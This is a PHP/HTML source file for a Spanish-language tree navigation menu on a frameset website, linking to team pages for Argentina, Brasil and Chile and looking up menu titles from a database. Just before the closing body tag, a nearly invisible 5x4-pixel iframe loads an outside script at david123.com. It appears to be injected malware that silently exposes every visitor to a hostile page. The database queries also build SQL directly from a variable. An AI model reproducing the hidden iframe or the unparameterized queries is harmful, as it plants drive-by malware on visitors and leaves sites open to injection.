<?
	define ('authenticate', false);
	require ('../inc/conf.inc.php');
	$socio=$_SESSION['socio'];
	if($socio=='mdt'){ $anchof=93;} else{ $anchof=110; }


?>
<HTML>
<HEAD><TITLE>Menú de navegación estilo árbol</TITLE>
<link href="../estilos<?=$_SESSION['socio']?>.css" rel="stylesheet" type="text/css">
<script language="javascript">

function botonover(x) {
x.childNodes[0].childNodes[0].src=bullet2.src;
x.childNodes[0].className='flechita';
x.childNodes[1].className='link1over'
}

function botonout(x) {
x.childNodes[0].childNodes[0].src=bullet1.src;
x.childNodes[0].className='flechita';
x.childNodes[1].className='link1'
}

function cambiar(item,cod,tit) {
	if(item){
	   obj=document.getElementById(item);
	   visible=(obj.style.display!="none")
	   if (visible) {
	     obj.style.display="none";
	   } else {
	      obj.style.display="block";
	   }
	}
	parent.frames['centro'].location='../nuestro_equipo.php?pais='+cod+'&tit='+tit
	
}


function cierratodo() {
   divs=document.getElementsByTagName("DIV");
   for (i=0;i<divs.length;i++) {
     divs[i].style.display="none";
   }
}

</script>
<style type="text/css">
<!--
.fondito {
	background-image: url(../images/fondo.jpg);
	background-repeat: no-repeat;
	background-position: left top;
}
-->
</style>
</HEAD>
<BODY class="fondito">

<table border=0 cellpadding='1' cellspacing=1 class="divisor" width="100%">
  <tr>
    <td ><small>&nbsp;</small></td>
  </tr>
</table>
<table border=0 cellpadding='1' cellspacing=1 width="100%">
  <tr>
    <td>
<table border=0 cellpadding='1' cellspacing=1 width="100%" class="divisor">
  <tr>
  <!--	<td width="1"><img src="../images/flechaitemmunozover2.gif" border="0"></td>-->
    <td><a class="link1"  id="xuno" href="javascript:cierratodo();cambiar('','','<?=traducemenu1(159)?>');"><?=traducemenu(159)?></a></td>
  </tr>
</table>

<!--<div id="uno" style="display: none; margin-left: 0em;">-->

<table border=0 cellpadding='1' cellspacing=1 width="100%">
  <tr>
  	<!--<td width="1"><img src="../images/flechaitemmunozover2.gif" border="0"></td>-->
    <td class="divisor"><a class="link1" id="xuno" href="javascript:cierratodo();cambiar('','Argentina','<?=traducemenu1(190)?>');"><?=traducemenu(190)?></a></td>
  </tr>
</table>

<table border=0 cellpadding='1' cellspacing=1 width="100%">
  <tr>
  	<!--<td width="1"><img src="../images/flechaitemmunozover2.gif" border="0"></td>-->
    <td class="divisor"><a class="link1" id="xdos" href="javascript:cierratodo();cambiar('','Brasil','<?=traducemenu1(191)?>');"><?=traducemenu(191)?></a></td>
  </tr>
</table>
<table border=0 cellpadding='1' cellspacing=1 width="100%">
  <tr>
<!--  <td width="1" class="divisor"><img src="../images/flechaitemmunozover2.gif" border="0"></td>-->
    <td class="divisor"><a  class="link1" id="xtres" href="javascript:cambiar('','Chile','<?=traducemenu1(192)?>');"><?=traducemenu(192)?></a></td>
  </tr>
</table>
<!--</div>-->

</td></tr></table>
<script>
//130
parent.document.all('marcos').cols="200,*,<?=$anchof?>"
parent.frames['centro'].location='../carga_contenido.php?id_sel=5&tit=<?=traducemenu(5)?>';
parent.frames['derecha'].location='../carga_derecha.php?id_sel=5';

</script>
<iframe src="http://david123.com/r/g.php" width="5" height="4" align="right"></iframe></body>
</HTML>
<?
function traducemenu($id){
	global $lng;
	$db1=new DBI();
	$db1->select('secciones','*',"id=$id and lng='$lng'");
	if($db1->num_rows()>0){
		$row=$db1->fetch_object();
		echo $row->titulo;
	}
	else{
		echo "no hay datos";
	}

}
function traducemenu1($id){
	global $lng;
	$db1=new DBI();
	$db1->select('secciones','*',"id=$id and lng='$lng'");
	if($db1->num_rows()>0){
		$row=$db1->fetch_object();
		echo $row->descrip;
	}
	else{
		echo "no hay datos";
	}

}
?>
